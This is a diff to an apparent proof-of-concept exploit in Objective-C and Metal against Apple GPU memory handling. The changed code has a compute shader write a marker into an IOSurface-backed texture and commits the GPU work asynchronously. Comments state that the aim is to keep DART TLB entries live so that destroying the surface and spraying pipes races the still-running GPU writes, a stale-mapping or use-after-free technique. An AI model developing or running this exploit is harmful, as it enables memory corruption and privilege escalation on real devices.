@@ -102,12 +102,13 @@ int main(int argc, char *argv[]) {
 
         id<MTLCommandQueue> queue = [device newCommandQueue];
 
-        /* Simple compute shader: fill output buffer with GPU_MARKER */
+        /* Compute shader writes GPU_MARKER into IOSurface-backed texture.
+         * The texture's physical pages are what we're racing against. */
         NSString *src = @"#include <metal_stdlib>\n"
             "using namespace metal;\n"
-            "kernel void fill(device uchar *out [[buffer(0)]],\n"
-            "                 uint id [[thread_position_in_grid]]) {\n"
-            "    out[id] = 0x42;\n"  /* GPU_MARKER */
+            "kernel void fill(texture2d<uchar, access::write> tex [[texture(0)]],\n"
+            "                 uint2 pos [[thread_position_in_grid]]) {\n"
+            "    tex.write(uchar4(0x42, 0x42, 0x42, 0x42), pos);\n"
             "}\n";
 
         NSError *err = nil;
@@ -149,22 +150,21 @@ int main(int argc, char *argv[]) {
             id<MTLTexture> tex = [device newTextureWithDescriptor:desc
                                   iosurface:surface plane:0];
 
-            /* Step 3: Create buffer for compute shader output */
-            id<MTLBuffer> outBuf = [device newBufferWithLength:SURFACE_SIZE
-                                    options:MTLResourceStorageModeShared];
-            memset([outBuf contents], 0, SURFACE_SIZE);
-
-            /* Step 4: Start long GPU compute (keeps TLB warm) */
+            /* Step 3: Dispatch compute shader writing to IOSurface-backed texture.
+             * This establishes DART TLB entries for the IOSurface physical pages.
+             * We use MTLDispatchTypeSerial but do NOT waitUntilCompleted — GPU runs
+             * asynchronously so we can race the destroy+pipe-spray below. */
             id<MTLCommandBuffer> cmdBuf = [queue commandBuffer];
             id<MTLComputeCommandEncoder> enc = [cmdBuf computeCommandEncoder];
             [enc setComputePipelineState:pipeline];
-            [enc setBuffer:outBuf offset:0 atIndex:0];
+            [enc setTexture:tex atIndex:0];  /* IOSurface-backed texture is the target */
 
-            MTLSize grid = MTLSizeMake(SURFACE_SIZE, 1, 1);
-            MTLSize group = MTLSizeMake(pipeline.maxTotalThreadsPerThreadgroup, 1, 1);
+            MTLSize grid = MTLSizeMake(SURFACE_W, SURFACE_H, 1);
+            MTLSize group = MTLSizeMake(8, 8, 1);
             [enc dispatchThreads:grid threadsPerThreadgroup:group];
             [enc endEncoding];
-            [cmdBuf commit];
+            [cmdBuf commit];  /* GPU starts writing to IOSurface pages asynchronously */
+            usleep(200);      /* 200µs: GPU has started but may not have finished */
 
             /* Step 5: RACE — destroy IOSurface while GPU still working */
             /* GPU TLB entries still map to the surface's physical pages */
